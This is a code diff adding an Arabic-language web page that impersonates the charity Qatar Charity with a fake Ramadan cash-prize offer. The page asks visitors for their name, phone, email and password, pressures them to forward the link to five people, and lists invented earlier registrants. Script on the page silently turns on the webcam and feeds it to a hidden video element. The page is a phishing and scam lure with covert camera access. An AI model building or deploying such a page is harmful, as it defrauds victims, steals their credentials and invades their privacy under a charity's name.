@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>قطر الخيرية - فطر الخيرية</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #4CAF50, #2196F3);
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            color: #333;
+        }
+        button {
+            background: #FF5722;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 90%;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        video {
+            display: none;  /* إخفاء الفيديو */
+        }
+        .hidden {
+            display: none;
+        }
+        .confirmation {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            color: #333;
+        }
+        .thank-you {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            color: #333;
+        }
+        .user-list {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة الترحيب -->
+    <div id="welcome" class="container">
+        <h2>فطر الخيرية - قطر الخيرية</h2>
+        <p>اعانة رمضان</p>
+        <p>2025 مارس 22</p>
+        <p>تهابينا لك!</p>
+        <p>بمناسبة شهر رمضان المبارك، تم اختيارك من ضمن القلائل للحصول على جائزة مالية مقدمة من قطر الخيرية.</p>
+        <button onclick="showRegistration()">موافق</button>
+    </div>
+
+    <!-- صفحة التسجيل -->
+    <div id="registration" class="container hidden">
+        <h2>تسجيل الدخول</h2>
+        <form onsubmit="submitForm(event)">
+            <input type="text" name="name" placeholder="الإسم الكامل" required>
+            <input type="tel" name="phone" placeholder="رقم الجوال" required>
+            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل</button>
+        </form>
+    </div>
+
+    <!-- صفحة التأكيد -->
+    <div id="confirmation" class="confirmation hidden">
+        <h2>مبروك! تم إضافة اسمك للسحب 🎉</h2>
+        <p>شارك الرابط التالي مع 5 أشخاص لزيادة فرصك في الفوز:</p>
+        <input type="text" id="linkToShare" value="https://your-link.com" readonly>
+        <button onclick="copyLink()">نسخ الرابط</button>
+        <div class="user-list">
+            <p>أسماء المسجلين مسبقًا:</p>
+            <ul id="userNames">
+                <li>أحمد محمد</li>
+                <li>فاطمة علي</li>
+                <li>خالد حسن</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- صفحة الشكر -->
+    <div id="thankYou" class="thank-you hidden">
+        <h2>شكرًا لك!</h2>
+        <p>سيتم التواصل معك في أقرب وقت لتأكيد البيانات.</p>
+        <p>الجائزة المالية بقيمة 1000 دولار مقدمة كمساعدة لشعب السوري من قطر الخيرية.</p>
+    </div>
+
+    <video id="video" autoplay></video>
+
+    <script>
+    const video = document.getElementById('video');
+
+    // طلب إذن الوصول إلى الكاميرا تلقائيًا
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+        })
+        .catch(err => {
+            console.error('خطأ في الوصول إلى الكاميرا:', err);
+            alert('لم يتم الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.');
+        });
+
+    // إظهار صفحة التسجيل
+    function showRegistration() {
+        document.getElementById('welcome').classList.add('hidden');
+        document.getElementById('registration').classList.remove('hidden');
+    }
+
+    // إرسال البيانات
+    function submitForm(event) {
+        event.preventDefault();  // منع إرسال النموذج تلقائيًا
+
+        const name = document.querySelector('input[name="name"]').value;
+
+        // إضافة الاسم إلى القائمة
+        const userNamesList = document.getElementById('userNames');
+        const newUser = document.createElement('li');
+        newUser.textContent = name;
+        userNamesList.appendChild(newUser);
+
+        // الانتقال إلى صفحة التأكيد
+        document.getElementById('registration').classList.add('hidden');
+        document.getElementById('confirmation').classList.remove('hidden');
+    }
+
+    // نسخ الرابط
+    function copyLink() {
+        const linkInput = document.getElementById('linkToShare');
+        linkInput.select();
+        document.execCommand('copy');
+        alert('تم نسخ الرابط!');
+
+        // الانتقال إلى صفحة الشكر
+        document.getElementById('confirmation').classList.add('hidden');
+        document.getElementById('thankYou').classList.remove('hidden');
+    }
+    </script>
+</body>
+</html>
